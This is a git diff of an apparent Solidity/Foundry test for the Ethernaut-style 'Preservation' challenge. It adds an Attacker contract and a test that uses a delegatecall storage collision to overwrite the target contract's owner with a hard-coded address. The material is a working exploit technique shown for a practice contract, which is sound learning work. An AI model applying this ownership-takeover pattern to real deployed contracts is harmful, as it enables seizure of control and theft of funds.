@@ -3,7 +3,21 @@ pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
 import {Preservation, LibraryContract} from "../src/Preservation.sol";
-import {Attacker} from "../src/Preservation.sol";
+
+contract Attacker {
+    address preservation;
+    address lib1 = address(0);
+    address lib2 = address(0);
+    address private constant Alice = 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea;
+
+    constructor(address _preservationAddress) {
+        preservation = _preservationAddress;
+    }
+
+    function setTime(uint256 _time) public {
+        lib2 = Alice;
+    }
+}
 
 contract PreservationTest is Test {
     Preservation preservation;
@@ -22,15 +36,15 @@ contract PreservationTest is Test {
     }
 
     function testPreservation() public {
-        address lib1 = preservation.timeZone1Library();
-        address lib2 = preservation.timeZone2Library();
-        address owner1 = preservation.owner();
+        // preservation.timeZone1Library();
+        // preservation.timeZone2Library();
+        // preservation.owner();
 
         bytes memory data = abi.encodeWithSignature("setFirstTime(uint256)", address(attacker));
         (bool success,) = address(preservation).call(data);
+        assertEq(success, true, "Failed to call setFirstTime");
 
         preservation.setFirstTime(block.timestamp);
-        address owner2 = preservation.owner();
-        assertEq(preservation.owner(), Alice);
+        assertEq(preservation.owner(), Alice, "Failed to set owner");
     }
 }
